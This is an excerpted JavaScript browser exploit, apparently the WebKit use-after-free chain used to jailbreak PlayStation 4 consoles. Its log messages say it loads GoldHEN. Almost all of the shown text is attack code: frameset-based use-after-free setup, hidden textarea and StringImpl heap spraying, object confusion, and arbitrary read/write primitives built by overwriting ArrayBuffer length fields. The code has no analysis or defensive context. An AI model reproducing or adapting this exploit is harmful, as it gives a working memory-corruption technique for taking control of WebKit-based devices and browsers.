...
function setupRW() {
	...
	let ab_addr = new Int64(str2array(g_relative_read, 8, diff + 0x10));
	let ab_index = g_jsview_leak.sub(ab_addr).low32();
	if (g_relative_rw[ab_index + LENGTH_JSVIEW + 0x18] === LENGTH_ARRAYBUFFER)
		g_ab_index = ab_index + LENGTH_JSVIEW;
	else
		g_ab_index = ab_index - LENGTH_JSVIEW;
	g_relative_rw[g_ab_index + 0x18] = 0x41;
	for (let i = 0; i < g_arr_ab_3.length; i++) {
	...
	g_relative_rw[g_ab_index + 0x18] = 0xff;
	g_relative_rw[g_ab_index + 0x18 + 1] = 0xff;
	g_relative_rw[g_ab_index + 0x18 + 2] = 0xff;
	g_relative_rw[g_ab_index + 0x18 + 3] = 0xff;
	...
	debug_log("[+] Loading GoldHEN 2b2. Please Wait...");
...
function read(addr, length) {
	for (let i = 0; i < 8; i++)
		g_relative_rw[g_ab_index + 0x10 + i] = addr.byteAt(i);
	let arr = [];
...
function confuseTargetObjRound2() {
	...
	g_fake_validation_message[4] = g_jsview_leak.add(0x18 + 5 - OFFSET_HTMLELEMENT_REFCOUNT).asDouble();
...
function handle2() {
 ...
 function reuseTargetObj() {
	document.documentElement.appendChild(g_input);
...
function prepareUAF() {
	...
	for (let i = 0; i < NB_FRAMES; i++) {
		let element = document.createElement("frameset");
...
function sprayHTMLTextArea() {
	debug_log("[+] Loading Web Exploit. Please Wait...");
	textarea_div_elem = document.body.appendChild(document.createElement("div"));
	textarea_div_elem.style.cssText = 'display:block-inline;height:1px;width:1px;visibility:hidden;';
...
function sprayStringImpl(start, end) {
	for (let i = start; i < end; i++) {
		let s = new String("A".repeat(0x48 - LENGTH_STRINGIMPL - 5) + i.toString().padStart(5, "0"));
		g_obj_str[s] = 0x1337;
	}
}
function go() {
